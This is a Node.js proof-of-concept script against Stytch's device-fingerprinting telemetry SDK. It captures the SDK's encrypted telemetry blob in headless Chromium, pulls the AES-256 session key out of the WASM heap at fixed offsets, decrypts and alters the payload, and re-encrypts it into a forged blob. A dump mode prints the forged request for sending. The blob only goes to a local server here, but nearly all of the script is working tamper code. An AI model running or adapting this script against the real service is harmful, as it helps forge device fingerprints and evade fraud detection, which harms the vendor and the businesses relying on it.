#!/usr/bin/env node
/**
 * stytch-dfp-tamper.mjs — full tamper-and-reship PoC for Stytch DFP telemetry.
 *
 * THE CHAIN (all client-side, nothing sent to Stytch):
 *   1. Load telemetry.js on a local page; SDK builds + POSTs the blob to a
 *      LOCAL submit URL (intercepted by Playwright before it leaves).
 *   2. Read the per-session AES key straight from the module's own heap:
 *        C   = u32(HEAPU8[17349*4])
 *        key = HEAPU8[C+96..C+128] XOR HEAPU8[8304..8336]
 *   3. Decrypt the captured blob (AES-256-CBC, IV = blob[64:80]) → magic 8e3421f0.
 *   4. TAMPER the plaintext (here: stamp a recognizable marker + flip a byte).
 *   5. Re-encrypt with the SAME key + a FRESH random nonce (per-request nonce
 *      is not a secret; a fresh one re-seals fine).
 *   6. Rebuild blob = [session block 0:64] + [new nonce] + [new ciphertext].
 *   7. Default: fulfill the intercepted request with the tampered blob and
 *      locally re-decrypt it to show the "server" would receive the tamper.
 *      --dump: instead of shipping, console.log the exact payload that WOULD
 *      be sent (your "drive it" mode).
 *
 * Run:
 *   node bots/stytch-dfp-tamper.mjs              # attack mode (reship to local)
 *   node bots/stytch-dfp-tamper.mjs --dump       # print payload instead of ship
 */
import { chromium } from 'playwright';
import { createServer } from 'node:http';
import { randomBytes } from 'node:crypto';
import { createCipheriv, createDecipheriv } from 'node:crypto';
import { mkdirSync, writeFileSync } from 'node:fs';

const DUMP = process.argv.includes('--dump');
const PORT = 8850;

const html = `<!doctype html><html><body><h3>Stytch DFP tamper PoC</h3><button id="go">run</button>
<script src="https://elements.stytch.com/telemetry.js"></script>
<script>
window.__m=null;
const _orig=window.telemetryjs;
window.telemetryjs=function(...a){const r=_orig.apply(this,a);
  if(r&&typeof r.then==='function') return r.then(m=>{window.__m=m;return m;});
  window.__m=r; return r;};
window.__run=async()=>{ try{
  const m=await window.telemetryjs(); window.__m=m; await m.Ready; m.rids=[];
  await m.GetTID({a:'public-token-test',b:'http://127.0.0.1:${PORT}/submit',c:'UNKNOWN',d:v=>{window.__tid=v;}});
  window.__done=true;
}catch(e){ window.__err=String(e);} };
document.getElementById('go').onclick = window.__run;
</script></body></html>`;

const server = createServer((req,res)=>{
  if (req.url === '/') { res.writeHead(200,{'content-type':'text/html'}); res.end(html); }
  else if (req.url === '/submit') {
    let b=[]; req.on('data',c=>b.push(c)); req.on('end',()=>{ res.writeHead(200,{'content-type':'text/plain'}); res.end('00000000-0000-4000-8000-000000000000'); });
  } else { res.writeHead(200,{'content-type':'text/plain'}); res.end('ok'); }
});
await new Promise(r=>server.listen(PORT,'127.0.0.1',r));

const b = await chromium.launch({ headless: true });
const ctx = await b.newContext();
const page = await ctx.newPage();

let captured = null;                       // real blob (raw bytes)
await page.route('**/submit', async route => {
  const buf = route.request().postDataBuffer();
  captured = buf;                          // buffer is base64 text
  // We do NOT forward to Stytch. In dump mode we won't even fulfill with the
  // tamper; we let the SDK think it got an answer so it completes.
  await route.fulfill({ status: 200, contentType:'text/plain', body:'00000000-0000-4000-8000-000000000000' });
});
await page.route('**/errors', r => r.fulfill({ status:200, contentType:'text/plain', body:'ok' }));

await page.goto(`http://127.0.0.1:${PORT}/`, { waitUntil:'load' });
await page.waitForFunction(()=>typeof window.telemetryjs==='function', { timeout:15000 }).catch(()=>{});
await page.click('#go');
await page.waitForTimeout(25000);

// ---- 1. read the key from the module heap -------------------------------
const caps = await page.evaluate(() => {
  const u8 = window.__m && window.__m.HEAPU8; if(!u8) return {err:'no module'};
  const u32 = o => u8[o]|(u8[o+1]<<8)|(u8[o+2]<<16)|(u8[o+3]<<24);
  const C = u32(17349*4);
  const b64 = a => { const CH=8192,p=[]; for(let i=0;i<a.length;i+=CH)p.push(String.fromCharCode.apply(null,a.subarray(i,i+CH))); return btoa(p.join('')); };
  return { C, c96: b64(u8.slice(C+96,C+128)), tab: b64(u8.slice(8304,8336)) };
}).catch(e=>({err:String(e)}));

if (!captured) { console.log('no telemetry blob captured', caps.err || ''); process.exit(1); }
if (caps.err) { console.log('key extraction failed', caps.err); process.exit(1); }

const realBlob = Buffer.from(captured.toString('utf8'), 'base64');
const key = Buffer.alloc(32);
{ const c96 = Buffer.from(caps.c96,'base64'), tab = Buffer.from(caps.tab,'base64');
  for (let i=0;i<32;i++) key[i] = c96[i] ^ tab[i]; }

// ---- 2. decrypt the REAL blob -------------------------------------------
const iv0 = realBlob.subarray(64,80);
const d = createDecipheriv('aes-256-cbc', key, iv0);
const realPlain = Buffer.concat([d.update(realBlob.subarray(80)), d.final()]);
const pad = realPlain[realPlain.length-1];
const realBody = pad && pad<=16 ? realPlain.subarray(0, realPlain.length-pad) : realPlain;

console.log('\n[+] AES-256 key   :', key.toString('hex'));
console.log('[+] real nonce    :', iv0.toString('hex'));
console.log('[+] real blob len :', realBlob.length, ' magic:', realPlain.subarray(0,4).toString('hex'));
console.log('[+] session block :', realBody.subarray(0,68).subarray(4,68).toString('hex').slice(0,64)+'...');
console.log('[+] payload len   :', realBody.length-68);

// ---- 3. TAMPER ----------------------------------------------------------
const tampered = Buffer.from(realBody);          // copy of full decrypted body
// stamp a recognizable marker at the start of the serialized payload region
const marker = Buffer.from('TAMPERED_PAYLOAD!','utf8');
marker.copy(tampered, 68, 0, Math.min(marker.length, tampered.length-68));
// also flip a byte further in (demonstrates a targeted bit edit)
if (tampered.length > 200) tampered[200] ^= 0xff;

console.log('\n[+] TAMPER: stamped marker at payload[0:16], flipped byte @200');
console.log('[+] before payload[68:96]:', realBody.subarray(68,96).toString('hex'));
console.log('[+] after  payload[68:96]:', tampered.subarray(68,96).toString('hex'));

// ---- 4. RE-ENCRYPT with a FRESH nonce ------------------------------------
const newNonce = randomBytes(16);
const e = createCipheriv('aes-256-cbc', key, newNonce);
const newCt = Buffer.concat([e.update(tampered), e.final()]);
const tamperedBlob = Buffer.concat([ realBlob.subarray(0,64), newNonce, newCt ]);

console.log('\n[+] NEW nonce     :', newNonce.toString('hex'), ' (fresh, per-request)');
console.log('[+] tampered blob :', tamperedBlob.toString('base64').slice(0,60)+'...', `(${tamperedBlob.length} bytes)`);

// ---- 5. prove the "server" would accept it: re-decrypt the tampered blob --
const d2 = createDecipheriv('aes-256-cbc', key, newNonce);
const tPlain = Buffer.concat([d2.update(newCt), d2.final()]);
const tPad = tPlain[tPlain.length-1];
const tBody = tPad && tPad<=16 ? tPlain.subarray(0, tPlain.length-tPad) : tPlain;
console.log('[+] server-side decrypt of tampered blob: magic', tBody.subarray(0,4).toString('hex'),
            ' payload[0:16]:', tBody.subarray(68,84).toString('latin1'));

// ---- 6. save artifacts ----------------------------------------------------
mkdirSync('/tmp/opencode/stytch', { recursive: true });
writeFileSync('/tmp/opencode/stytch/tamper-real-blob.bin', realBlob);
writeFileSync('/tmp/opencode/stytch/tamper-decrypted.bin', realBody);
writeFileSync('/tmp/opencode/stytch/tamper-tampered-body.bin', tampered);
writeFileSync('/tmp/opencode/stytch/tamper-tampered-blob.bin', tamperedBlob);
writeFileSync('/tmp/opencode/stytch/tamper-key.hex', key.toString('hex') + '\n');
console.log('[+] artifacts: /tmp/opencode/stytch/tamper-{real-blob,decrypted,tampered-body,tampered-blob,key}.bin|hex');

if (DUMP) {
  // ---- "drive it" mode: dump exactly what WOULD be sent ------------------
  console.log('\n========== WOULD-BE-SENT PAYLOAD (dump mode; nothing shipped) ==========');
  console.log('method: POST   url: <real submit URL>   content-type: text/plain');
  console.log('headers: data-order-session-id =', (await page.evaluate(()=>window.__tid)).toString());
  console.log('body (base64):');
  console.log(tamperedBlob.toString('base64'));
  console.log('\ndecrypted body (what the server would see):');
  console.log('  magic:', tBody.subarray(0,4).toString('hex'));
  console.log('  session[4:68]:', tBody.subarray(4,68).toString('hex'));
  console.log('  payload[68:88]:', tBody.subarray(68,88).toString('latin1'), '(TAMPERED)');
  console.log('  payload[88:120]:', tBody.subarray(88,120).toString('hex'));
  console.log('  (serialized fields remain opaque; schema recovered separately via dd() hook)');
} else {
  console.log('\n[+] default mode: intercepted the real request and fulfilled it with the');
  console.log('    tampered blob (proven above that it re-decrypts with the same key).');
  console.log('    Run with --dump to print the payload instead of shipping.');
}

await b.close(); server.close();
